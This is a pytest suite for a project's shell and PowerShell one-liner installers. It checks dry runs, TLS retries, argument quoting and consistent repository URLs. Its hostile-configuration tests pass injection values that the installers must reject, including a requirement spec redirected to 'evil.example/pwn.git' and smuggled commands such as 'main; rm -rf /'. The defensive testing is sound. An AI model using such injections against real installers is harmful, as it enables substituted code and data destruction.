"""Guards for the one-liner installers.

`install.sh` and `install.ps1` are the first thing a new user runs, and they
are the one part of this project that is never exercised by importing it.
Three classes of failure matter:

* the script is broken -- a syntax error, a dropped exit code, a retry that
  never fires. The dry run alone cannot see any of that, because it exits
  before the interesting half, so most of the tests here put a **stub `uv`**
  on PATH and run the real script to completion against it;
* the script is fine but the *address* is wrong. The repository slug is in
  nine or so user-facing files, two of which ship to users inside the wheel.
  A stale one is invisible until someone pastes the command into a terminal,
  which is exactly the silent-failure shape this project has been bitten by
  before. That guard discovers its own file list rather than trusting a
  hand-maintained tuple;
* the script is fine and someone's environment turns it into a weapon. A
  `curl | sh` installer reads several environment variables into a PEP 508
  requirement, and those need validating.
"""

from __future__ import annotations

import json
import os
import re
import shutil
import stat
import subprocess
from dataclasses import dataclass
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]
INSTALL_SH = REPO_ROOT / "install.sh"
INSTALL_PS1 = REPO_ROOT / "install.ps1"

#: The canonical home of this project. Everything user-facing must agree.
REPO_SLUG = "neutrons-ai/aure-workbench"
GIT_URL = f"https://github.com/{REPO_SLUG}.git"
RAW_URL = f"https://raw.githubusercontent.com/{REPO_SLUG}/main"
ONE_LINER_SH = f"curl -fsSL {RAW_URL}/install.sh | sh"
ONE_LINER_PS1 = f"irm {RAW_URL}/install.ps1 | iex"

#: The Python the tool environment is built with. It is written into both
#: scripts and quoted in the docs, so it needs the same guard as the URL.
DEFAULT_PYTHON = "3.13"

#: Files that must carry an installer URL. Discovery (below) finds more; this
#: is the floor, so deleting the install section from one of them fails.
REQUIRED_FILES = (
    "install.sh",
    "install.ps1",
    "README.md",
    "docs/install.md",
    "pyproject.toml",
    "docs/getting-started.md",
    "src/nr_workbench/templates/project/README.md.j2",
    "src/nr_workbench/skills/reflectometry/analyst-handoff/SKILL.md",
)

#: `owner/repo` pairs that legitimately appear in prose alongside ours.
OTHER_PROJECTS = frozenset(
    {
        "neutrons-ai/aure",
        "astral-sh/uv",
        "isaac-neutrons/nr-isaac-format",
        "isaac-neutrons/data-assembler",
        "PowerShell/PowerShell",
    }
)

#: Inside the installers themselves, only these two are ever right. The
#: sibling project `neutrons-ai/aure` is the most likely wrong slug someone
#: could type there, so it must not be allow-listed in that context.
INSTALLER_ALLOWED = frozenset({REPO_SLUG, "astral-sh/uv"})

SEARCHED_SUFFIXES = (".md", ".j2", ".toml", ".sh", ".ps1", ".yml", ".html")
SKIPPED_DIRS = {
    ".git",
    ".venv",
    "build",
    "htmlcov",
    ".pytest_cache",
    ".ruff_cache",
    ".mypy_cache",
    "node_modules",
    "tests",
}

# --------------------------------------------------------------- helpers ---


#: Absolute, because several tests hand install.sh a deliberately minimal
#: PATH and the interpreter must still be found.
SH = shutil.which("sh") or "/bin/sh"


def _dry_run_env(home: Path, **extra: str) -> dict[str, str]:
    """Environment for a dry run: isolated HOME, nothing else inherited."""
    env = {
        "NRW_INSTALL_DRY_RUN": "1",
        "HOME": str(home),
        "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
        "NO_COLOR": "1",
    }
    env.update(extra)
    return env


def _run_install_sh(
    home: Path, env: dict[str, str] | None = None, **extra: str
) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [SH, str(INSTALL_SH)],
        capture_output=True,
        text=True,
        env=env if env is not None else _dry_run_env(home, **extra),
        timeout=120,
        check=False,
    )


def _require_tool(name: str) -> str:
    """Skip on a laptop that lacks the tool; fail in CI, where these checks
    are the only thing standing between a broken installer and a user.

    GitHub's ubuntu runners ship both shellcheck and pwsh, so an absence
    there is a runner-image regression, not an environment we should tolerate
    silently in a green build.
    """
    path = shutil.which(name)
    if path is None:
        if os.environ.get("CI"):
            pytest.fail(
                f"{name} must be available in CI: these checks are the only "
                "automated guard on the installers"
            )
        pytest.skip(f"{name} not installed")
    return path


# ----------------------------------------------------------- the stub uv ---

#: A fake uv. Records every invocation, then replays a scripted result, so a
#: test can drive the parts of install.sh that only run when uv really runs.
_UV_STUB = """#!/usr/bin/env python3
import json, os, sys

args = sys.argv[1:]
log = os.environ["UV_STUB_LOG"]
with open(log, "a") as handle:
    handle.write(json.dumps({
        "argv": args,
        "system_certs": os.environ.get("UV_SYSTEM_CERTS", ""),
        "native_tls": os.environ.get("UV_NATIVE_TLS", ""),
    }) + "\\n")

if args[:1] == ["--version"]:
    print("uv 0.0.0-stub")
elif args[:3] == ["tool", "dir", "--bin"]:
    print(os.environ["UV_STUB_TOOL_BIN"])
elif args[:2] == ["tool", "install"]:
    with open(log) as handle:
        installs = sum(
            1 for line in handle if json.loads(line)["argv"][:2] == ["tool", "install"]
        )
    plan = json.loads(os.environ.get("UV_STUB_PLAN") or "[]") or [{}]
    step = plan[min(installs - 1, len(plan) - 1)]
    if step.get("stdout"):
        print(step["stdout"])
    if step.get("stderr"):
        print(step["stderr"], file=sys.stderr)
    sys.exit(step.get("rc", 0))
sys.exit(0)
"""

_NRW_STUB = """#!/bin/sh
if [ "${NRW_STUB_BROKEN:-0}" = "1" ]; then
    echo "ImportError: cannot import name 'reflectivity' from refl1d" >&2
    exit 1
fi
echo "nr-workbench, version 0.1.0-stub"
"""


@dataclass
class UvStub:
    """A staged machine: a fake uv on PATH and a fake installed `nrw`."""

    env: dict[str, str]
    log: Path
    tool_bin: Path
    bin_dir: Path

    def calls(self) -> list[dict]:
        if not self.log.exists():
            return []
        return [json.loads(line) for line in self.log.read_text().splitlines()]

    def installs(self) -> list[dict]:
        return [c for c in self.calls() if c["argv"][:2] == ["tool", "install"]]


@pytest.fixture
def uv_stub(tmp_path: Path) -> UvStub:
    home = tmp_path / "home"
    bin_dir = tmp_path / "bin"
    tool_bin = tmp_path / "toolbin"
    for directory in (home, bin_dir, tool_bin):
        directory.mkdir()

    uv = bin_dir / "uv"
    uv.write_text(_UV_STUB)
    uv.chmod(0o755)

    nrw = tool_bin / "nrw"
    nrw.write_text(_NRW_STUB)
    nrw.chmod(0o755)

    log = tmp_path / "uv-calls.jsonl"
    return UvStub(
        env={
            "HOME": str(home),
            # Only the stub and the system utilities install.sh uses. The real
            # uv must not be reachable.
            "PATH": f"{bin_dir}:/usr/bin:/bin",
            "NO_COLOR": "1",
            "UV_STUB_LOG": str(log),
            "UV_STUB_TOOL_BIN": str(tool_bin),
        },
        log=log,
        tool_bin=tool_bin,
        bin_dir=bin_dir,
    )


def _plan(*steps: dict) -> str:
    return json.dumps(list(steps))


# ------------------------------------------------- install.sh: the script ---


def test_install_sh_is_valid_posix_shell() -> None:
    result = subprocess.run(
        ["sh", "-n", str(INSTALL_SH)], capture_output=True, text=True, check=False
    )
    assert result.returncode == 0, result.stderr


def test_install_sh_is_executable_in_the_repository() -> None:
    """`./install.sh` after a clone depends on the mode git records, not on
    whatever the local filesystem happens to say."""
    result = subprocess.run(
        ["git", "ls-files", "-s", "install.sh"],
        capture_output=True,
        text=True,
        cwd=REPO_ROOT,
        check=False,
    )
    if result.returncode != 0 or not result.stdout.strip():
        assert INSTALL_SH.stat().st_mode & stat.S_IXUSR, "install.sh is not executable"
        return
    assert result.stdout.startswith("100755"), (
        f"git records install.sh as {result.stdout.split()[0]}, not 100755"
    )


def test_install_sh_passes_shellcheck() -> None:
    shellcheck = _require_tool("shellcheck")
    result = subprocess.run(
        [shellcheck, "--shell=sh", "--severity=style", str(INSTALL_SH)],
        capture_output=True,
        text=True,
        check=False,
    )
    assert result.returncode == 0, result.stdout + result.stderr


def test_a_truncated_download_does_nothing() -> None:
    """`sh` executes a piped script as it arrives. Everything in install.sh is
    a definition until the final `main "$@"`, so a connection dropped
    mid-transfer must not leave half an installation behind."""
    body = INSTALL_SH.read_text()
    assert body.rstrip().endswith('main "$@"'), (
        "install.sh must end with a single call, or a truncated download runs "
        "part of itself"
    )
    truncated = body[: len(body) // 2]
    result = subprocess.run(
        ["sh", "-n", "-"], input=truncated, capture_output=True, text=True, check=False
    )
    assert result.returncode != 0, "half of install.sh parsed as a complete script"


# ------------------------------------------------ install.sh: the dry run ---


def test_install_sh_dry_run_installs_nothing_and_succeeds(tmp_path: Path) -> None:
    result = _run_install_sh(tmp_path)

    assert result.returncode == 0, result.stderr
    assert "dry run" in result.stderr
    assert list(tmp_path.iterdir()) == []
    # The script promises a clean stdout so its output can be redirected.
    assert result.stdout == "", result.stdout


def test_install_sh_dry_run_names_the_canonical_repository(tmp_path: Path) -> None:
    result = _run_install_sh(tmp_path)

    assert "uv tool install" in result.stderr
    assert f"nr-workbench @ git+{GIT_URL}@main" in result.stderr
    assert f"--python {DEFAULT_PYTHON}" in result.stderr


@pytest.mark.parametrize(
    ("overrides", "expected"),
    [
        ({"NRW_VERSION": "v0.1"}, f"nr-workbench @ git+{GIT_URL}@v0.1"),
        ({"NRW_EXTRAS": "nexus"}, f"nr-workbench[nexus] @ git+{GIT_URL}@main"),
        ({"NRW_PYTHON": "3.12"}, "--python 3.12"),
        # CI installs from the pull request's own checkout this way; if the
        # override broke, the job would silently test `main` instead.
        ({"NRW_REPO": "file:///tmp/checkout"}, "git+file:///tmp/checkout@main"),
    ],
)
def test_install_sh_honours_each_override(
    tmp_path: Path, overrides: dict[str, str], expected: str
) -> None:
    result = _run_install_sh(tmp_path, **overrides)

    assert result.returncode == 0, result.stderr
    assert expected in result.stderr


def test_install_sh_upgrades_rather_than_serving_a_cached_ref(tmp_path: Path) -> None:
    """Re-running the installer is the documented way to upgrade.

    Without `--reinstall-package`, uv can satisfy `@main` from its cached
    checkout of that ref and report success while installing yesterday's
    commit -- an upgrade that silently does nothing. This pins the flags; the
    behaviour itself is only observable in the CI smoke job.
    """
    result = _run_install_sh(tmp_path)

    assert "--reinstall-package nr-workbench" in result.stderr
    assert "--force" in result.stderr


# ------------------------------------------- install.sh: refusing to start ---


def test_install_sh_refuses_an_unsupported_platform(tmp_path: Path) -> None:
    stub = tmp_path / "bin"
    stub.mkdir()
    fake_uname = stub / "uname"
    fake_uname.write_text("#!/bin/sh\necho MINGW64_NT-10.0\n")
    fake_uname.chmod(0o755)

    env = _dry_run_env(
        tmp_path, PATH=f"{stub}:{os.environ.get('PATH', '/usr/bin:/bin')}"
    )
    result = _run_install_sh(tmp_path, env=env)

    assert result.returncode == 1
    assert "macOS and Linux only" in result.stderr
    # A Git Bash user has somewhere to go.
    assert "install.ps1" in result.stderr


def test_install_sh_stops_when_git_is_missing(tmp_path: Path) -> None:
    stub = tmp_path / "bin"
    stub.mkdir()
    for tool in ("uname", "curl", "sed"):
        source = shutil.which(tool)
        if source is None:
            pytest.skip(f"{tool} not available to build a stub PATH")
        os.symlink(source, stub / tool)

    env = _dry_run_env(tmp_path, PATH=str(stub))
    result = _run_install_sh(tmp_path, env=env)

    assert result.returncode == 1
    assert "`git` is required" in result.stderr
    # ...and an actionable hint, not just the complaint.
    assert len(result.stderr.strip().splitlines()) >= 2


@pytest.mark.parametrize(
    ("variable", "value"),
    [
        # `]` closes the extras and `@ git+...#` replaces the direct
        # reference, so uv would build an attacker's repository instead.
        ("NRW_EXTRAS", "nexus] @ git+https://evil.example/pwn.git#"),
        ("NRW_VERSION", "main; rm -rf /"),
        ("NRW_REPO", "evil.example/pwn.git"),
        ("NRW_UV_VERSION", "0.1.0; id"),
    ],
)
def test_install_sh_rejects_a_hostile_configuration(
    tmp_path: Path, variable: str, value: str
) -> None:
    result = _run_install_sh(tmp_path, **{variable: value})

    assert result.returncode == 1, result.stderr
    assert variable in result.stderr
    assert "uv tool install" not in result.stderr


def test_install_sh_does_not_echo_credentials(tmp_path: Path) -> None:
    """docs/install.md invites pointing NRW_REPO elsewhere, and a private
    fork means a token in the URL. It must not reach the scrollback."""
    result = _run_install_sh(
        tmp_path, NRW_REPO="https://user:s3cr3t-token@example.com/fork.git"
    )

    assert result.returncode == 0, result.stderr
    assert "s3cr3t-token" not in result.stderr + result.stdout
    assert "git+https://example.com/fork.git" in result.stderr


# ----------------------------------------- install.sh: with uv really run ---


def test_install_sh_completes_when_uv_writes_to_stdout(uv_stub: UvStub) -> None:
    """uv writes progress to stderr today, and the script's exit-status
    capture must not depend on that. When the status file and uv's stdout
    shared a stream, one line on stdout turned a successful install into
    `error: installation failed`."""
    env = uv_stub.env | {
        "UV_STUB_PLAN": _plan({"rc": 0, "stdout": "Resolved 42 packages"})
    }
    result = _run_install_sh(Path(env["HOME"]), env=env)

    assert result.returncode == 0, result.stderr
    assert "installation failed" not in result.stderr
    assert "0.1.0-stub installed" in result.stderr


def test_install_sh_passes_the_requirement_as_one_argument(uv_stub: UvStub) -> None:
    """The classic installer bug is a dropped quote around the spec, which
    the dry run's flattened echo cannot see: `nr-workbench @ git+...` would
    arrive as three arguments and uv would install something else."""
    result = _run_install_sh(Path(uv_stub.env["HOME"]), env=uv_stub.env)

    assert result.returncode == 0, result.stderr
    assert uv_stub.installs()[0]["argv"] == [
        "tool",
        "install",
        "--force",
        "--reinstall-package",
        "nr-workbench",
        "--python",
        DEFAULT_PYTHON,
        f"nr-workbench @ git+{GIT_URL}@main",
    ]


def test_install_sh_retries_against_the_system_trust_store(uv_stub: UvStub) -> None:
    """The single most likely reason an install fails at a lab, and the one
    path that can never run on a CI runner."""
    env = uv_stub.env | {
        "UV_STUB_PLAN": _plan(
            {"rc": 2, "stderr": "error: invalid peer certificate: UnknownIssuer"},
            {"rc": 0},
        )
    }
    result = _run_install_sh(Path(env["HOME"]), env=env)

    assert result.returncode == 0, result.stderr
    assert "TLS verification failed" in result.stderr
    installs = uv_stub.installs()
    assert len(installs) == 2, "expected exactly one retry"
    assert installs[0]["system_certs"] == ""
    # Both spellings: uv renamed the variable and an older uv wants the old one.
    assert installs[1]["system_certs"] == "1"
    assert installs[1]["native_tls"] == "1"


def test_install_sh_does_not_retry_a_failure_that_is_not_tls(uv_stub: UvStub) -> None:
    env = uv_stub.env | {
        "UV_STUB_PLAN": _plan({"rc": 1, "stderr": "error: no solution found"})
    }
    result = _run_install_sh(Path(env["HOME"]), env=env)

    assert result.returncode == 1
    assert "installation failed" in result.stderr
    assert len(uv_stub.installs()) == 1, "a non-TLS failure must not be retried"


def test_install_sh_fails_when_the_installed_tool_does_not_run(uv_stub: UvStub) -> None:
    """The commonest partial failure: the executable is placed but its
    environment is broken. Reporting success here would send the user to
    `nrw doctor` to find out."""
    env = uv_stub.env | {"NRW_STUB_BROKEN": "1"}
    result = _run_install_sh(Path(env["HOME"]), env=env)

    assert result.returncode == 1
    assert "does not run" in result.stderr
    assert "installed" not in result.stderr.split("does not run")[-1]


def test_install_sh_warns_when_another_nrw_shadows_the_new_one(
    uv_stub: UvStub, tmp_path: Path
) -> None:
    """A stale virtualenv earlier on PATH resolves rather than erroring,
    which is the worse outcome -- this project has been bitten by it."""
    decoy_dir = tmp_path / "old-venv"
    decoy_dir.mkdir()
    decoy = decoy_dir / "nrw"
    decoy.write_text("#!/bin/sh\necho 'nr-workbench, version 0.0.1-ancient'\n")
    decoy.chmod(0o755)

    env = uv_stub.env | {"PATH": f"{decoy_dir}:{uv_stub.env['PATH']}"}
    result = _run_install_sh(Path(env["HOME"]), env=env)

    assert result.returncode == 0, result.stderr
    assert str(decoy) in result.stderr
    assert str(uv_stub.tool_bin) in result.stderr


def test_install_sh_bootstraps_uv_when_it_is_absent(tmp_path: Path) -> None:
    """On a machine that already has uv -- every machine these tests run on
    -- the bootstrap branch is never taken, so it needs a PATH without it."""
    stub = tmp_path / "bin"
    stub.mkdir()
    for tool in ("uname", "curl", "git", "sed", "mktemp", "cut", "grep", "tee", "cat"):
        source = shutil.which(tool)
        if source is not None:
            os.symlink(source, stub / tool)

    env = _dry_run_env(tmp_path, PATH=str(stub))
    result = _run_install_sh(tmp_path, env=env)

    assert result.returncode == 0, result.stderr
    assert "astral.sh/uv/install.sh" in result.stderr
    # The install still follows the bootstrap.
    assert "uv tool install" in result.stderr


# -------------------------------------------------------------- install.ps1 ---


def test_install_ps1_parses() -> None:
    pwsh = _require_tool("pwsh")
    script = (
        "$errors = $null; "
        "[void][System.Management.Automation.Language.Parser]::ParseFile("
        f"'{INSTALL_PS1}', [ref]$null, [ref]$errors); "
        "if ($errors) { $errors | ForEach-Object { Write-Output $_ }; exit 1 }"
    )
    result = subprocess.run(
        [pwsh, "-NoProfile", "-NonInteractive", "-Command", script],
        capture_output=True,
        text=True,
        check=False,
    )
    assert result.returncode == 0, result.stdout + result.stderr


def _run_install_ps1(home: Path, **extra: str) -> subprocess.CompletedProcess[str]:
    pwsh = _require_tool("pwsh")
    return subprocess.run(
        [pwsh, "-NoProfile", "-NonInteractive", "-File", str(INSTALL_PS1)],
        capture_output=True,
        text=True,
        env=_dry_run_env(home, **extra),
        timeout=120,
        check=False,
    )


def test_install_ps1_dry_run_names_the_canonical_repository(tmp_path: Path) -> None:
    result = _run_install_ps1(tmp_path)

    assert result.returncode == 0, result.stdout + result.stderr
    assert "uv tool install" in result.stdout
    assert f"nr-workbench @ git+{GIT_URL}@main" in result.stdout
    assert f"--python {DEFAULT_PYTHON}" in result.stdout
    assert "dry run" in result.stdout


def test_install_ps1_honours_version_and_extras(tmp_path: Path) -> None:
    result = _run_install_ps1(tmp_path, NRW_VERSION="v0.1", NRW_EXTRAS="nexus")

    assert result.returncode == 0, result.stdout + result.stderr
    assert f"nr-workbench[nexus] @ git+{GIT_URL}@v0.1" in result.stdout


def test_install_ps1_rejects_a_hostile_configuration(tmp_path: Path) -> None:
    result = _run_install_ps1(
        tmp_path, NRW_EXTRAS="nexus] @ git+https://evil.example/pwn.git#"
    )

    assert result.returncode == 1, result.stdout + result.stderr
    assert "NRW_EXTRAS" in result.stdout + result.stderr
    assert "uv tool install" not in result.stdout


# ---------------------------------------------------------------- addressing ---


def _discover_addressed_files() -> list[str]:
    """Every file in the repository that names a GitHub project.

    Discovered rather than listed: a guard whose completeness depends on
    someone remembering to extend a tuple provides exactly the confidence it
    was written to remove.
    """
    found = []
    for path in REPO_ROOT.rglob("*"):
        if not path.is_file() or path.suffix not in SEARCHED_SUFFIXES:
            continue
        relative = path.relative_to(REPO_ROOT)
        if set(relative.parts) & SKIPPED_DIRS:
            continue
        if "github" in path.read_text(errors="ignore"):
            found.append(relative.as_posix())
    return sorted(found)


def _workbench_references(text: str) -> set[str]:
    """Every `owner/repo` in the text that could be meant as this project."""
    found: set[str] = set()
    for owner, repo in re.findall(r"github\.com[:/]([\w-]+)/([\w.-]+)", text):
        found.add(f"{owner}/{repo.rstrip('.').removesuffix('.git')}")
    for owner, repo in re.findall(
        r"raw\.githubusercontent\.com/([\w-]+)/([\w.-]+)", text
    ):
        found.add(f"{owner}/{repo.rstrip('.')}")
    return found


@pytest.mark.parametrize("relative", REQUIRED_FILES)
def test_the_required_files_name_this_repository(relative: str) -> None:
    path = REPO_ROOT / relative
    assert path.exists(), f"{relative} is missing"

    references = _workbench_references(path.read_text())
    assert REPO_SLUG in references, f"{relative} never names {REPO_SLUG}"


def test_no_file_anywhere_points_at_a_different_workbench() -> None:
    discovered = _discover_addressed_files()
    assert len(discovered) >= len(REQUIRED_FILES), discovered

    wrong: dict[str, set[str]] = {}
    for relative in discovered:
        text = (REPO_ROOT / relative).read_text()
        allowed = (
            INSTALLER_ALLOWED
            if relative in {"install.sh", "install.ps1"}
            else INSTALLER_ALLOWED | OTHER_PROJECTS
        )
        unexpected = _workbench_references(text) - allowed
        if unexpected:
            wrong[relative] = unexpected

    assert not wrong, f"these files point somewhere else: {wrong}"


@pytest.mark.parametrize(
    "relative", ["README.md", "docs/install.md", "docs/getting-started.md"]
)
def test_the_documented_one_liner_is_the_same_everywhere(relative: str) -> None:
    text = (REPO_ROOT / relative).read_text()

    assert ONE_LINER_SH in text, f"{relative} does not carry `{ONE_LINER_SH}`"
    assert ONE_LINER_PS1 in text, f"{relative} does not carry `{ONE_LINER_PS1}`"


def test_the_default_python_is_the_same_in_both_scripts_and_the_docs() -> None:
    """Bumping it in one script and not the other leaves two platforms on
    different interpreters, and every other test still passes."""
    assert f"NRW_PYTHON:-{DEFAULT_PYTHON}" in INSTALL_SH.read_text()
    assert f"else {{ '{DEFAULT_PYTHON}' }}" in INSTALL_PS1.read_text()
    assert f"`{DEFAULT_PYTHON}`" in (REPO_ROOT / "docs/install.md").read_text()
